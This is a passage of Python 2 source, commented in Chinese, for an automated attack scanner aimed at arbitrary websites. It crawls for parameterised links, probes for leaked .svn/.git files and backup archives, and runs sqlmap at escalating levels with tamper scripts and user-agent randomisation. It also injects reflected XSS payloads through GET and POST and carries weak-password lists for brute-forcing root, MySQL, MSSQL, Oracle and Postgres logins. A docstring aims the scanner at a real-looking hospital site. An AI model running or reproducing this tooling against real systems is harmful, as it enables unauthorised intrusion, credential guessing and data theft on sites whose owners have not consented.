        links = soup.findAll('a')
        for link in links:
            _url = link.get('href')
            res = re.search('(javascript|:;|#)', str(_url))
            res1 = re.search('.(jpg|png|bmp|mp3|wma|wmv|gz|zip|rar|iso|pdf|txt|db)', str(_url))
            if res == None and res1 == None:
                result.append(str(_url))
            else:
                pass
        if result != []:
            rst = list(set(result))
            for rurl in rst:
                if '//' in rurl and 'http' in rurl:
                    # https://www.yamibuy.com/cn/search.php?tags=163
                    # http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
                    if domain in rurl:
                        if '?' in rurl and '=' in rurl:
                            # result_links.append(rurl)
                            id_links.append(rurl)
                        if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                            if '?' not in rurl:
                                # result_links.append(rurl)
                                html_links.append(rurl)

                else:
                    # search.php?tags=163
                    if '?' in rurl and '=' in rurl:
                        # result_links.append(url + '/' + rurl)
                        id_links.append(url + '/' + rurl)
                    if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                        # result_links.append(url + '/' + rurl)
                        if '?' not in rurl:
                            html_links.append(url + '/' + rurl)

            for x1 in html_links:
                try:
                    rx1 = requests.head(url=x1, headers=headers, timeout=5).status_code
                    if rx1 == 200:
                        htht.append(x1)
                except Exception, e:
                    writedata('[WARNING ERROR]  ' + str(e))
                    pass
            for x2 in id_links:
                try:
                    rx2 = requests.head(url=x2, headers=headers, timeout=5).status_code
                    if rx2 == 200:
                        idid.append(x2)
                except Exception, e:
                    writedata('[WARNING ERROR]  ' + str(e))
                    pass

            if htht == []:
                pass
            else:
                for x in htht:
                    if x.count('/') > 3:
                        ra = re.search('.*?/[0-9]\.', x)
                        if ra == None:
                            pass
                        else:
                            html_links_s.append(x)
                        if html_links_s == []:
                            html_links_s.append(random.choice(htht))

                if html_links_s == []:
                    result_links['html_links'] = random.choice(htht)
                else:
                    result_links['html_links'] = random.choice(html_links_s)

            if idid == []:
                pass
            else:
                result_links['id_links'] = random.choice(idid)
        if result_links == {}:
            return None
        else:
            return result_links
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    return None


def scan_svn(url):
    # 传入的url后缀不带/
    url_svn = url + '/.svn/entries'
    writedata('[SCAN SVN_INFO]  ' + str(url_svn))
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_svn = requests.head(url=url_svn, headers=headers, allow_redirects=False, timeout=5)

        if r_svn.status_code == 200:
            try:
                r_svn_1 = requests.get(url=url_svn, headers=headers, allow_redirects=False, timeout=5)
                if 'dir' in r_svn_1.content and 'svn://' in r_svn_1.content:
                    _ = str(r_svn_1.url) + ':SVN源码泄露'
                    return _
            except Exception as e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass

        else:
            pass
    except Exception as e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass


def scan_git(url):
    url_git = url + '/.git/config'
    writedata('[SCAN GIT_INFO]  ' + str(url_git))
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_git = requests.head(url=url_git, headers=headers, allow_redirects=False, timeout=5)

        if r_git.status_code == 200:

            try:
                r_git_1 = requests.get(url=url_git, headers=headers, allow_redirects=False, timeout=5)
                if 'repositoryformatversion' in r_git_1.content:
                    _ = str(r_git_1.url) + ':GIT源码泄露'
                    return _
                else:
                    pass
            except Exception as e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass
    except Exception as e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass


def scan_backup(urlx):
    print unicode('扫描敏感文件中.....', 'utf-8')
    result = []
    backup_name_B = []
    # result_list=[]
    # http://www.langzi.fun 或者 http://www.hao.langzi.fun
    k1 = urlx.split('//')[1]
    # www.langzi.fun
    k2 = urlx.split('//')[1].replace('.', '_')
    # www_langzi_fun
    k3 = urlx.split('.', 1)[1].replace('/', '')
    # langzi.fun
    k3_1 = urlx.split('.', 1)[1].replace('/', '').replace('.', '_')
    # langzi_fun
    k3_2 = urlx.split('.', 1)[1].replace('/', '').replace('.', '')
    # langzifun

    k4 = urlx.split('//')[1].split('.')[1]
    # langzi
    k4_2 = urlx.split('//')[1].split('.')[0] if urlx.split('//')[1].split('.')[0] != 'www' else \
        urlx.split('//')[1].split('.')[1]
    # www

    backup_name_B.append(k1)
    backup_name_B.append(k2)
    backup_name_B.append(k3)
    backup_name_B.append(k4)
    backup_name_B.append(k3_2)
    backup_name_B.append(k3_1)
    backup_name_B.append(k4_2)
    try:
        backup_name_B = list(set(backup_name_B))
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass

    if urlx.endswith('/'):
        url = urlx
    else:
        url = urlx + '/'

    # url_info = url + 'WEB-INF/web.xml'
    # try:
    #     UA = random.choice(headerss)
    #     headers = {'User-Agent': UA}
    #     r_info = requests.head(url=url_info, headers=headers, allow_redirects=False, timeout=5)
    #     if r_info.status_code == 200:
    #         try:
    #             r_info_1 = requests.get(url=url_info, headers=headers, allow_redirects=False, timeout=5)
    #             if '<web-app' in r_info_1.content:
    #                 _ = str(r_info_1.url) + str(':WEBinfo信息泄露')
    #                 result.append(_)
    #             else:
    #                 pass
    #         except Exception as e:
    #             pass
    # except Exception as e:
    #     pass

    for x in backup_name_B:
        # 生成的
        for y in backup_name_A:
            # 后缀
            urll = url.strip('/') + '/' + x + y
            writedata('[SCAN BACKUP_FILE]  ' + str(urll))
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                r_domain = requests.head(url=urll, headers=headers, allow_redirects=False, timeout=5)
                if r_domain.status_code == 200:
                    try:
                        if int(r_domain.headers["Content-Length"]) > 2000000:
                            rar_size = str(int(r_domain.headers["Content-Length"]) / 1000000) + 'M'
                            _ = str(r_domain.url) + ':' + str(rar_size)
                            result.append(_)
                        else:
                            pass
                    except Exception as e:
                        writedata('[WARNING ERROR]  ' + str(e))
                        pass
                else:
                    pass
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass

    for x in backup_name_C:
        urllx = url.strip('/') + x
        writedata('[SCAN BACKUP_FILE]  ' + str(urllx))
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain = requests.head(url=urllx, headers=headers, allow_redirects=False, timeout=5)
            if r_domain.status_code == 200:

                try:
                    if int(r_domain.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain.headers["Content-Length"]) / 1000000) + 'M'
                        _ = str(r_domain.url) + ':' + str(rar_size)
                        result.append(_)

                    else:
                        pass
                except Exception as e:
                    writedata('[WARNING ERROR]  ' + str(e))
                    pass
            else:
                pass
        except Exception, e:
            writedata('[WARNING ERROR]  ' + str(e))
            pass

    # for x in dir_list:
    #     for y in backup_name_B:
    #         for z in backup_name_A:
    #             urll = url.strip('/') + '/' + x + '/' + y + z
    #             try:
    #                 UA = random.choice(headerss)
    #                 headers = {'User-Agent': UA}
    #                 r_domain = requests.head(url=urll, headers=headers, allow_redirects=False, timeout=5)
    #
    #                 if r_domain.status_code == 200:
    #
    #                     try:
    #                         if int(r_domain.headers["Content-Length"]) > 2000000:
    #                             rar_size = str(int(r_domain.headers["Content-Length"]) / 1000000) + 'M'
    #                             _ = str(r_domain.url) + ':' + str(rar_size)
    #                             result.append(_)
    #                         else:
    #                             pass
    #                     except Exception as e:
    #                         writedata('[WARNING ERROR]  ' + str(e))
    #                         pass
    #                 else:
    #                     pass
    #             except Exception, e:
    #                 writedata('[WARNING ERROR]  ' + str(e))
    #                 pass

    # for x in dir_list:
    #     for y in backup_name_C:
    #         urll = url.strip('/') + '/' + x + y
    #         try:
    #             UA = random.choice(headerss)
    #             headers = {'User-Agent': UA}
    #             r_domain = requests.head(url=urll, headers=headers, allow_redirects=False, timeout=5)
    #             if r_domain.status_code == 200:
    #
    #                 try:
    #                     if int(r_domain.headers["Content-Length"]) > 2000000:
    #                         rar_size = str(int(r_domain.headers["Content-Length"]) / 1000000) + 'M'
    #                         _ = str(r_domain.url) + ':' + str(rar_size)
    #                         result.append(_)
    #
    #                     else:
    #                         pass
    #                 except Exception as e:
    #                     writedata('[WARNING ERROR]  ' + str(e))
    #                     pass
    #             else:
    #                 pass
    #         except Exception, e:
    #             writedata('[WARNING ERROR]  ' + str(e))
    #             pass
    if result == []:
        return None
    else:
        return result


# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------备份文件完毕--------------------------------------------------------------------------------
'''
三个函数，返回的结果分别是 1 SVN字符串 2 GIT字符串 3 BACK列表
分别是
scan_backup() 列表
scan_git()    字符串
scan_svn()    字符串
如果没有结果就返回None
'''


# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------

# sql注入检测开始

def check(result, url, common, title='获取标题失败'):
    results = {}
    url = url.replace('^', '')
    if '---' in result:
        if 'sqlmap was not able to fingerprint the back-end database management syste' not in result:
            try:
                result_info = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', result, re.S)
                inj = result_info.group(1)
                dbs = result_info.group(2)
                results['url'] = url
                results['title'] = title
                results['common'] = common
                results['report_0'] = inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace(
                    'Title: ', '注入标题 : ').replace('Payload: ', '注入攻击 : ')
                if 'back-end DBMS' in dbs:
                    results['report_1'] = dbs.replace('the back-end DBMS is ', '数据库类型 : ').replace(
                        'web server operating system: ', '服务器版本 : ').replace('web application technology: ',
                                                                             '服务器语言 : ').replace('back-end DBMS: ',
                                                                                                 '数据库版本 : ')
                else:
                    results['report_1'] = '可能存在注入但被拦截,或者无法识别数据库版本'
                return results
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))
        else:
            try:
                result_info = re.search('---(.*?)---.*?INFO\] (.*?)\[', result, re.S)
                inj = result_info.group(1)
                results['url'] = url
                results['title'] = title
                results['common'] = common
                results['report_0'] = inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace(
                    'Title: ', '注入标题 : ').replace('Payload: ', '注入攻击 : ')
                results['report_1'] = '存在注入但无法识别数据库版本'
                return results
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))


def scan_level_1(url, title):
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --batch --thread=10 --random-agent' % url
    # 'Level 1 : ' + url.replace('^', '').replace('*', '')
    writedata(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        writedata(result)
        resu = check(result, url=url, common=comm, title=title)
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    finally:
        res.terminate()
        return resu


def scan_level_2(url, title):
    urls, datas = url.split('?')[0], url.split('?')[1]
    urls = urls.replace('&', '^&')
    datas = datas.replace('&', '^&')
    comm_cookie = os_run + "sqlmap.py -u {} --cookie {} --level 2 --batch --thread=10 --random-agent".format(urls,
                                                                                                             datas)
    print 'Level 2 : ' + url.replace('^', '').replace('*', '')
    comm_post = os_run + "sqlmap.py -u {} --data {} --level 2 --batch --thread=10 --random-agent".format(urls, datas)
    writedata(comm_post)
    writedata(comm_cookie)

    try:
        res = subprocess.Popen(comm_cookie, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        writedata(result)
        resu = check(result, url=url, common=comm_cookie, title=title)
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    finally:
        res.terminate()
        if resu != None:
            return resu

    try:
        res = subprocess.Popen(comm_post, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        writedata(result)
        resu = check(result, url=url, common=comm_post, title=title)
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    finally:
        res.terminate()
        return resu


def scan_level_3(url, title):
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % url
    print 'Level 3 : ' + url.replace('^', '').replace('*', '')
    writedata(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        writedata(result)

        resu = check(result, url=url, common=comm, title=title)
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    finally:
        res.terminate()
        return resu


def scan_level_4(url, title):
    urls, datas = url.split('?')[0], url.split('?')[1]
    urls = urls.replace('&', '^&')
    datas = datas.replace('&', '^&')
    comm_cookie = os_run + "sqlmap.py -u {} --cookie {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(
        urls, datas)
    print 'Level 4 : ' + url.replace('^', '').replace('*', '')
    comm_post = os_run + "sqlmap.py -u {} --data {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(
        urls, datas)
    writedata(comm_cookie)
    writedata(comm_post)

    try:
        res = subprocess.Popen(comm_cookie, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        writedata(result)

        resu = check(result, url=url, common=comm_cookie, title=title)
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    finally:
        res.terminate()
        if resu != None:
            return resu

    try:
        res = subprocess.Popen(comm_post, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        writedata(result)
        resu = check(result, url=url, common=comm_post, title=title)
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    finally:
        res.terminate()
        return resu


def scan_level_5(url, title):
    # 获取完整注入url即可
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(
        url)
    print 'Level 5 : ' + url.replace('^', '').replace('*', '')
    writedata(comm)

    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        writedata(result)

        resu = check(result, url=url, common=comm, title=title)
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    finally:
        res.terminate()
        return resu


def scan_html(url, title, level):
    urlse = url.replace('.htm', '*.htm').replace('.shtm', '*.shtm')
    urls = urlse.replace('&', '^&')
    if level == 1 or level == 2:
        comm = os_run + 'sqlmap.py -u {} --batch --thread=10 --random-agent'.format(urls)
        if level == 1:
            #print 'Level 1 : ' + urls.replace('^', '').replace('*', '')
            pass
        if level == 2:
            print 'Level 2 : ' + urls.replace('^', '').replace('*', '')
    if level == 3 or level == 4:
        comm = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % urls
        if level == 3:
            print 'Level 3 : ' + urls.replace('^', '').replace('*', '')
        else:
            print 'Level 4 : ' + urls.replace('^', '').replace('*', '')
    if level == 5:
        comm = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(
            urls)
        print 'Level 5 : ' + urls.replace('^', '').replace('*', '')

    writedata(comm)

    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        writedata(result)

        resu = check(result, url=urls, common=comm, title=title)
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    finally:
        res.terminate()
        return resu


def scan_sql(url, level=1):
    link = get_links(url)
    if link == None:
        pass
    else:
        print unicode('检测SQL注入中.....', 'utf-8')
        if 'html_links' in link.keys():
            res1 = scan_html(link['html_links'].replace(' ', ''), link['title'], level)
            if res1 == None:
                pass
            else:
                return res1
        if 'id_links' in link.keys():
            if level == 1:
                return scan_level_1(link['id_links'].replace(' ', ''), link['title'])
            if level == 2:
                return scan_level_2(link['id_links'].replace(' ', ''), link['title'])
            if level == 3:
                return scan_level_3(link['id_links'].replace(' ', ''), link['title'])
            if level == 4:
                return scan_level_4(link['id_links'].replace(' ', ''), link['title'])
            if level == 5:
                return scan_level_5(link['id_links'].replace(' ', ''), link['title'])
            if level == 6:
                dix1 = scan_level_1(link['id_links'].replace(' ', ''), link['title'])
                if dix1 != None:
                    return dix1
                dix2 = scan_level_2(link['id_links'].replace(' ', ''), link['title'])
                if dix2 != None:
                    return dix2
                dix3 = scan_level_3(link['id_links'].replace(' ', ''), link['title'])
                if dix3 != None:
                    return dix3
                dix4 = scan_level_4(link['id_links'].replace(' ', ''), link['title'])
                if dix4 != None:
                    return dix4
                dix5 = scan_level_5(link['id_links'].replace(' ', ''), link['title'])
                if dix5 != None:
                    return dix5


# -----------------------------------------------------------------------------------

'''
    检测sql注入，传入两个参数，网址和扫描等级
    如果存在注入，就返回字典

    res = scan_sql('http://xy.5971.com',level=1)
    if res != None:
        print res['title']
        print res['url']
        print res['common']
        print res['report_0']
        # 注入方式，参数等等
        print res['report_1']
        # 数据库信息等
'''


# -----------------------------------------------------------------------------------


def GET(url, level):
    result = {}
   # print 'GET Level %s : ' % level + url
    try:
        try:
            site = url
            finalurl = urlparse.urlparse(site)
            urldata = urlparse.parse_qsl(finalurl.query)
            domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
            domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
            connection = httplib.HTTPConnection(domain)
            connection.connect()
            url = site
            paraname = []
            paravalue = []
            payloads = []
            if level == 1:
                payloads = payload_1
            if level == 2:
                payloads = payload_2
            if level == 3:
                payloads = payload_3
            if level == 4:
                payloads = payload_4

            o = urlparse.urlparse(site)
            parameters = urlparse.parse_qs(o.query, keep_blank_values=True)
            path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
                site).path
            for para in parameters:  # Arranging parameters and values.
                for i in parameters[para]:
                    paraname.append(para)
                    paravalue.append(i)

            # 定义
            fpar = []
            progress = 0

            for pn, pv in zip(paraname, paravalue):  # Scanning the parameter.
                fpar.append(str(pn))
                for x in payloads:  #
                    validate = x.translate(None, whitespace)
                    if validate == "":
                        progress = progress + 1
                    else:
                        progress = progress + 1
                        enc = urllib.quote_plus(x)
                        data = path + "?" + pn + "=" + pv + enc
                        page = urllib.urlopen(data)
                        sourcecode = page.read()
                        if x in sourcecode:
                            result['url'] = url
                            result['request'] = 'GET'
                            result['value'] = pn
                            result['payload'] = x
                            # with open('result.txt','a+')as a:
                            #     a.write('检测网址 : '+url + '\n')
                            #     a.write('提交方式 : GET' + '\n')
                            #     a.write('漏洞参数 : '+pn+'\n')
                            #     a.write('攻击载荷 : '+x+'\n')
                            #     a.write('------------------------------------\n')
                            return result

        except Exception, e:
            writedata('[WARNING ERROR]  ' + str(e))
            pass
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass


def POST(domains, data, level):
    result = {}
  #  print 'POST Level %s : ' % level + domains + '?' + data
    try:
        try:
            try:
                br = mechanize.Browser()
                br.addheaders = [('User-agent',
                                  'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
                br.set_handle_robots(False)
                br.set_handle_refresh(False)
                site = domains
                finalurl = urlparse.urlparse(site)
                urldata = urlparse.parse_qsl(finalurl.query)
                domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                connection = httplib.HTTPConnection(domain)
                connection.connect()
                path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
                    site).path

                url = site
                param = data
                payloads = []
                if level == 1:
                    payloads = payload_1
                if level == 2:
                    payloads = payload_2
                if level == 3:
                    payloads = payload_3
                if level == 4:
                    payloads = payload_4

                lop = str(len(payloads))
                params = "http://www.analyz3r.cn/?" + param
                finalurl = urlparse.urlparse(params)
                urldata = urlparse.parse_qsl(finalurl.query)
                o = urlparse.urlparse(params)
                parameters = urlparse.parse_qs(o.query, keep_blank_values=True)
                paraname = []
                paravalue = []
                for para in parameters:  # Arranging parameters and values.
                    for i in parameters[para]:
                        paraname.append(para)
                        paravalue.append(i)
                fpar = []
                fresult = []
                total = 0
                progress = 0
                pname1 = []  # parameter name
                payload1 = []
                for pn, pv in zip(paraname, paravalue):  # Scanning the parameter.
                    fpar.append(str(pn))
                    for i in payloads:
                        validate = i.translate(None, whitespace)
                        if validate == "":
                            progress = progress + 1
                        else:
                            progress = progress + 1
                            pname1.append(pn)
                            payload1.append(str(i))
                            d4rk = 0
                            for m in range(len(paraname)):
                                d = paraname[d4rk]
                                d1 = paravalue[d4rk]
                                tst = "".join(pname1)
                                tst1 = "".join(d)
                                if pn in d:
                                    d4rk = d4rk + 1
                                else:
                                    d4rk = d4rk + 1
                                    pname1.append(str(d))
                                    payload1.append(str(d1))
                            data = urllib.urlencode(dict(zip(pname1, payload1)))
                            r = br.open(path, data)
                            sourcecode = r.read()
                            pname1 = []
                            payload1 = []
                            if i in sourcecode:
                                result['url'] = domains + '?' + data
                                result['request'] = 'POST'
                                result['value'] = pn
                                result['payload'] = i
                                #
                                # with open('result.txt', 'a+')as a:
                                #     a.write('检测网址 : ' + domains + '?' + data + '\n')
                                #     a.write('提交方式 : POST' +  '\n')
                                #     a.write('漏洞参数 : ' + pn + '\n')
                                #     a.write('攻击载荷 : ' + i + '\n')
                                #     a.write('------------------------------------\n')
                                return result
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass
        except Exception, e:
            writedata('[WARNING ERROR]  ' + str(e))
            pass
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass


def scan_xss(url, level=1):
    try:
        link = get_links(url)
      #  print link
        if link == None:
            pass
        else:
            print unicode('检测XSS漏洞中.....', 'utf-8')
            if 'id_links' in link.keys():
                res1 = GET(link['id_links'], level=level)
                domain, data = link['id_links'].split('?')[0], link['id_links'].split('?')[1]
                res2 = POST(domains=domain, data=data, level=level)
                if res1 != None:
                    return res1
                if res2 != None:
                    return res2
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))


# -------------------------------------------
'''
扫描xss
    res = scan_xss('http://www.gxhospital.com')
    if res != None:
        print res['url']
        print res['request']
        print res['payload']
        PRINT RES['value']
    返回结果：{'url': 'http://www.gxhospital.com/service.asp?id=4', 'request': 'GET', 'payload': '</script>"><script>prompt(1)</script>', 'value': 'id'}

'''


# -----------------------------------------------


# 数据库弱口令
# 获取url对应的ip
# IP相关
def ip2hostname(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    try:
        query_data = "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x21\x00\x01"
        dport = 137
        _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        _s.sendto(query_data, (ip, dport))
        x = _s.recvfrom(1024)
        tmp = x[0][57:]
        hostname = tmp.split("\x00", 2)[0].strip()
        hostname = hostname.split()[0]
        return hostname
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass


def get_ip(url):
    hostname = url.replace('http://', '').replace('https://', '').replace('/', '')
    url_ip = 'None'
    try:
        url_ip = socket.gethostbyname(str(hostname))
    except Exception, e:
        writedata('[WARNING ERROR]  ' + str(e))
        pass
    return url_ip


weak_password = ['admin12345', 'admin123', 'asdfghjkl', 'mysql', '123456789qq', 'admin@123', 'q123456789', '12345',
                 '7894561230', '123456789', 'zxc123', 'postgres', 'password123', 'asd123', '789456123', 'qwe123', '123',
                 '9876543210', 'password', '123698745', '1q2w3e4r', '123123', 'w123456', '1233211234567',
                 '7708801314520', '147258369', '123qwe', '1234', 'qwertyuiop', '1q2w3e', '123abc', 'qaz123456',
                 '123456', 'zxcvbnm123', 'qazwsxedc', '0123456789', '1314520520', '1234554321', 'okmnji', '123456789a',
                 'admin123!@#', 'woaini1314', '1234567891234567', 'qwe123456', 'ubuntu', 'Sa1234', 'aa123456', '123465',
                 '1234567899', '5201314', '1234567891', '1234567890', '123456abc', 'iloveyou', 'admin1234', 'abc123',
                 '123456789.', 'Sa123', '1111111111', 'zxcvbnm', 'q123456', '0000000000000000', 'www123456',
                 'woaini123', '123qaz', '12345678910', '1234567', '0000000000', 'asd123456', 'abc123456', 'zxc123456',
                 'qq5201314', 'qq123456', '123456.', '1111111111111111', '0000', '88888888', '12345678', '12345678900',
                 'admin#123', '123123123', 'abc123456789', '123456q', 'abcd123456', 'qq123456789', 'woaini521',
                 '123456a', 'Passw0rd', 'root', 'test123', 'abcd1234', '1357924680', '123456aa', 'abc12345', 'qwerty',
                 'woaini', '5201314520', '111111111', 'as123456', '1472583690', 'z123456', '123456789abc', '1qaz2wsx',
                 'test', '000000000', 'qazwsx', 'Sa123456', '123456qwerty', '987654321', '123456qq', '123456..',
                 'aaa123456', '135792468', 'w123456789', 'a123456789', '000000', 'woaini520', 'aini1314', 'q1w2e3r4',
                 '111111', '123456789q', '110120119', 'oracle', 'a123456']

system_user_list = ['root', 'ubuntu']
system_passwords_list = ['admin12345','admin1234', 'ubuntu','root','a123456','123465','123456789','111111','888888','88888888','666666','123456']
# system_passwords_list = ['admin12345', 'admin123', 'asdfghjkl', 'mysql', '123456789qq', 'admin@123', 'q123456789',
#                          '7894561230', '123456789', 'zxc123', 'postgres', 'password123', 'asd123', '789456123',
#                          'qwe123', '123', '000000000', 'password', '123698745', '1q2w3e4r', '123123', 'w123456',
#                          '1233211234567', '7708801314520', '147258369', '123qwe', '1234', 'qwertyuiop', '1q2w3e',
#                          '123abc', 'qaz123456', 'root', '123456', 'zxcvbnm123', 'qazwsxedc', '0123456789', '1314520520',
#                          '1234554321', 'okmnji', '123456789a', 'admin123!@#', 'woaini1314', '1234567891234567',
#                          'qwe123456', 'ubuntu', 'Sa1234', 'aa123456', '123465', '1234567899', '5201314', '1234567891',
#                          '1234567890', '123456abc', 'iloveyou', 'admin1234', 'abc123', '123456789.', 'Sa123',
#                          '1111111111', 'zxcvbnm', 'q123456', '0000000000000000', 'www123456', 'woaini123', '123qaz',
#                          '12345678910', '1234567', '0000000000', 'asd123456', 'abc123456', 'zxc123456', 'qq5201314',
#                          'qq123456', '123456.', '1111111111111111', '0000', '88888888', '12345678', '12345678900',
#                          'admin#123', '123123123', 'abc123456789', '123456q', 'abcd123456', 'qq123456789', '000000',
#                          '123456a', 'Passw0rd', '12345', 'test123', 'abcd1234', '1357924680', '123456aa', 'abc12345',
#                          'qwerty', 'woaini', '5201314520', '111111111', 'as123456', '1472583690', 'z123456',
#                          '123456789abc', '1qaz2wsx', 'test', '9876543210', 'qazwsx', 'Sa123456', '123456qwerty',
#                          '987654321', '123456qq', '123456..', 'aaa123456', '135792468', 'w123456789', 'a123456789',
#                          'woaini521', 'woaini520', 'aini1314', 'q1w2e3r4', '111111', '123456789q', '110120119',
#                          'oracle', 'a123456']

oracle_user_list = ['sys', 'system', 'sysman', 'scott', 'aqadm', 'Dbsnmp']

oracle_password_list = ['', 'manager', 'oem_temp', 'tiger', 'aqadm', 'dbsnmp', 'root']

mysql_user_list = ['root']

mysql_password_list = ['root','123456','admin1234','a123456', '12345','123456789','111111','888888','88888888','666666']

# mysql_password_list = ['root', 'admin123!@#', 'test123', 'qazwsx', 'zxcvbnm', 'admin12345', 'admin123', 'qwerty',
#                        '1q2w3e', 'mysql', '123qaz', '123456', 'postgres', 'admin@123', '1234567', 'abc123456', 'okmnji',
#                        '1qaz2wsx', 'test', 'qq123456', '1234', 'woaini1314', '0000', '123456qwerty', 'password123',
#                        '123456789a', '12345678', 'Passw0rd', '123', 'admin#123', '123456789', 'password', '1q2w3e4r',
#                        'a123456789', '000000', '123123', 'q1w2e3r4', '111111', '123456a', 'iloveyou', 'admin1234',
#                        'abc123', 'oracle', 'a123456', '12345', '123qwe']

mssql_user_list = ['sa']

mssql_password_list = ['root', 'Sa123', 'Sa123456', 'Sa1234','123456','admin1234','a123456', '12345','123456789','111111','888888','88888888','666666']

# mssql_password_list = ['root', 'Sa123', 'Sa123456', 'Sa1234', 'admin123!@#', 'test123', 'qazwsx', 'zxcvbnm',
#                        'admin12345', 'admin123', 'qwerty', '1q2w3e', 'mysql', '123qaz', '123456', 'postgres',
#                        'admin@123', '1234567', 'abc123456', 'okmnji', '1qaz2wsx', 'test', 'qq123456', '1234',
#                        'woaini1314', '0000', '123456qwerty', 'password123', '123456789a', '12345678', 'Passw0rd', '123',
#                        'admin#123', '123456789', 'password', '1q2w3e4r', 'a123456789', '000000', '123123', 'q1w2e3r4',
#                        '111111', '123456a', 'iloveyou', 'admin1234', 'abc123', 'oracle', 'a123456', '12345', '123qwe']

postql_user_list = ['postgres', 'root', 'admin']

postql_password_list = ['root','postgres','admin','123456','admin1234','a123456', '12345','123456789','111111','888888','88888888','666666']

# postql_password_list = ['root', 'admin123!@#', 'test123', 'qazwsx', 'zxcvbnm', 'admin12345', 'admin123', 'qwerty',
#                         '1q2w3e', 'mysql', '123qaz', '123456', 'postgres', 'admin@123', '1234567', 'abc123456',
#                         'okmnji', '1qaz2wsx', 'test', 'qq123456', '1234', 'woaini1314', '0000', '123456qwerty',
#                         'password123', '123456789a', '12345678', 'Passw0rd', '123', 'admin#123', '123456789',
#                         'password', '1q2w3e4r', 'a123456789', '000000', '123123', 'q1w2e3r4', '111111', '123456a',
#                         'iloveyou', 'admin1234', 'abc123', 'oracle', 'a123456', '12345', '123qwe']

def get_baidu_weights(url):
    x = str(random.randint(1, 9))
    data = {
        't': 'rankall',
        'on': 1,
        'type': 'baidupc',
        'callback': 'jQuery111303146901980779846_154444474116%s' % (x),
        'host': url
    }

    headers = {

        'Accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
